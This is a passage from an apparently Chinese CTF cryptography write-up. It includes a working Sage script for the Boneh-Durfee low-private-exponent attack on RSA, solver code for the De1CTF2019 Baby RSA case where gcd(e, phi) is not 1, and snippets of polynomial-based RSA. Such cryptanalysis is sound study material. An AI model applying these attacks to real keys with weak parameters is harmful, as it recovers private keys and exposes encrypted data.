class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don't have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn't necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don't work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span><span class="params">(BB, modulus)</span>:</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    print(nothelpful, <span class="string">"/"</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">" vectors are not helpful"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(BB, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span><span class="params">(BB, monomials, bound, current)</span>:</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == <span class="number">-1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(current, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let's check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">"* removing unhelpful vector"</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> range(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    print(<span class="string">"* removing unhelpful vectors"</span>, ii, <span class="string">"and"</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn't bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span><span class="params">(pol, modulus, mm, tt, XX, YY)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> range(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn<span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"failure"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        print(<span class="string">"We do not have det &lt; bound. Solutions might not be found."</span>)</span><br><span class="line">        print(<span class="string">"Try with highers m and t."</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            print(<span class="string">"size det(L) - size e^(m*n) = "</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"optimizing basis of the lattice via LLL, this can take a long time"</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"LLL is done!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"looking for independent vectors in the lattice"</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> range(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> range(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"found them, using vectors"</span>, pol1_idx, <span class="string">"and"</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        print(<span class="string">"no independant vectors could be found. This should very rarely happen..."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(soly) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Your prediction (delta) is too small"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bb</span></span><br><span class="line">    c = <span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.28</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = int((<span class="number">1</span><span class="number">-2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don't touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== checking values ==="</span>)</span><br><span class="line">        print(<span class="string">"* delta:"</span>, delta)</span><br><span class="line">        print(<span class="string">"* delta &lt; 0.292"</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        print(<span class="string">"* size of e:"</span>, int(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        print(<span class="string">"* size of N:"</span>, int(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        print(<span class="string">"* m:"</span>, m, <span class="string">", t:"</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== running algorithm ==="</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"=== solution found ==="</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            print(<span class="string">"x:"</span>, solx)</span><br><span class="line">            print(<span class="string">"y:"</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        print(<span class="string">"private key found:"</span>, d)</span><br><span class="line">        print(<span class="string">"plaintext:"</span>, pow(c, d, N))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"=== no solution was found ==="</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== %s seconds ==="</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure><h3 id="RSA-gcd-e-varphi-n-neq-1"><a href="#RSA-gcd-e-varphi-n-neq-1" class="headerlink" title="RSA - $gcd(e,\varphi(n)\neq 1)$"></a>RSA - $gcd(e,\varphi(n)\neq 1)$</h3><h4 id="Theorem-9"><a href="#Theorem-9" class="headerlink" title="Theorem"></a>Theorem</h4><p>$gcd(e,\varphi(n))\neq 1$时，$e’\leftarrow e//gcd(e,\varphi(n)),d\leftarrow invert(e’,\varphi(n))$，$c^{d}\equiv m^{gcd(e,\varphi(n))}\ mod\ n$</p><p>已知$m^{gcd(e,\varphi(n))}$后攻击方向不定，视题目而定</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>De1CTF2019 - Baby RSA</p><p>最后步骤的加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>(c1==pow(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==pow(flag,e2,p*q2))</span><br></pre></td></tr></table></figure><p>p, q1, q2 均为素数，$f_{1}=gcd(e_{1},\varphi(pq_{1}))\neq 1,f_{2}=gcd(e_{2},\varphi(pq_{2}))\neq 1$</p><p>但发现$gcd(e_{1},\varphi(pq_{1}))=gcd(e_{2},\varphi(pq_{2}))=14$，于是可以用ext_gcd求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f3, lcm = GCRT([n1, n2], [f1, f2])</span><br><span class="line"><span class="keyword">assert</span>(f3 % n1 == f1)</span><br><span class="line"><span class="keyword">assert</span>(f3 % n2 == f2)</span><br><span class="line"><span class="keyword">assert</span>(lcm == q1*q2*p)</span><br></pre></td></tr></table></figure><p>又发现gcd=14的因子7来自p，所以令$n_{3}=q_{1}\cdot q_{2},c_{3}=f_{3}\%n_{3}$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d3 = gmpy2.invert(<span class="number">7</span>, phi3)</span><br><span class="line">m3 = pow(c3, d3, n3)</span><br></pre></td></tr></table></figure><p>$m_{3}\equiv m^{2}\ mod\ n_{3}$</p><p>作小公钥指数的爆破即可.</p><p>但m如果太大时，就要用到一些有限域上开二次根的算法，在本文后面会有所提及.</p><h3 id="RSA-Polynomial-based-RSA"><a href="#RSA-Polynomial-based-RSA" class="headerlink" title="RSA - Polynomial based RSA"></a>RSA - Polynomial based RSA</h3><h4 id="Theorem-10"><a href="#Theorem-10" class="headerlink" title="Theorem"></a>Theorem</h4><p>设p为素数，$F_{p}$为p元有限域，$F_{p}$上多项式形式的RSA是基于$F_{p}$上多项式的一个已知定理，可类比欧拉定理</p><p>设$F_{p}[x]$是$F_{p}$上的一元多项式环，P和Q为$F_{p}(x)$上的既约多项式，$N=P\cdot Q$，$F_{p}[x]$的模N商环下的多项式M满足gcd(M,N)=1</p><p>则$M^{\varphi(N)}=1$（对于多项式下的$\varphi(N)$，不同于ZZ上RSA的$(p-1)\cdot (q-1)$，但基本定义相同，即度小于degree(N)的所有满足gcd(*,N)的多项式*）</p><p>$\because$ P, Q均为既约多项式，<br>$\therefore\varphi(P)=p^{P.degree()}-1,\varphi(Q)=p^{Q.degree()}-1,\varphi(N)=(p^{P.degree()}-1)\cdot (p^{Q.degree()}-1)$</p><p>加密过程中，明文m的多项式表示方法大致有以下两种：</p><ol><li><p>对应ascii码作多项式系数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">R.&lt;y&gt; = PolynomialRing(GF(p))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_irreducable_poly</span><span class="params">(deg)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        out = R.random_element(degree=deg)</span><br><span class="line">        <span class="keyword">if</span> out.is_irreducible():</span><br><span class="line">            <span class="keyword">return</span> out</span><br><span class="line">       </span><br><span class="line">P = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span>*length))</span><br><span class="line">Q = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span>*length))</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">N = P*Q</span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'xxxx'</span></span><br><span class="line">flag = list(bytearray(flag.encode()))</span><br><span class="line">m = S(flag)</span><br><span class="line">c = m^e</span><br></pre></td></tr></table></figure></li><li><p>在$GF(p^{nbits})$上fetch_int</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">P.&lt;x&gt;=PolynomialRing(GF(p))</span><br><span class="line"><span class="comment">## 略去P,Q,N生成代码</span></span><br><span class="line">R.&lt;y&gt; = GF(p^<span class="number">2049</span>)</span><br><span class="line">m_int = Integer(bytes_to_long(flag))</span><br><span class="line">m_poly = P(R.fetch_int(m_int))</span><br><span class="line">c_poly = pow(m_poly, e, n)</span><br><span class="line">c_int = R(c_poly).integer_representation()</span><br></pre></td></tr></table></figure></li></ol><h4 id="exp-9"><a 